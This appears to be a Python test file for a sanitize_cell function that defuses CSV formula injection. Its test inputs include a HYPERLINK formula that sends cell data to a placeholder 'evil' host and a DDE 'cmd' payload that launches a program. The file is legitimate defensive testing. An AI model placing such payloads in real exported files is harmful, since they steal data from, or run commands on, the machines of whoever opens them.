"""Tests for csv_safe.sanitize_cell — CSV / formula injection neutralization."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from csv_safe import sanitize_cell


def test_none_becomes_empty_string():
    assert sanitize_cell(None) == ""


def test_plain_text_is_unchanged():
    assert sanitize_cell("Acme Corp") == "Acme Corp"


def test_numbers_pass_through_untouched():
    # Negative amounts must stay numeric, not be quoted into text.
    assert sanitize_cell(-50.0) == -50.0
    assert sanitize_cell(1234.56) == 1234.56
    assert sanitize_cell(0) == 0


def test_equals_formula_is_neutralized():
    assert sanitize_cell("=1+1") == "'=1+1"


def test_hyperlink_exfiltration_is_neutralized():
    payload = '=HYPERLINK("http://evil/?d="&A1,"click")'
    assert sanitize_cell(payload) == "'" + payload


def test_plus_at_and_minus_string_triggers_are_neutralized():
    assert sanitize_cell("+1+1") == "'+1+1"
    assert sanitize_cell("@SUM(A1)") == "'@SUM(A1)"
    assert sanitize_cell("-2+3+cmd|' /c calc'!A0") == "'-2+3+cmd|' /c calc'!A0"


def test_leading_control_char_is_neutralized():
    assert sanitize_cell("\t=1+1") == "'\t=1+1"
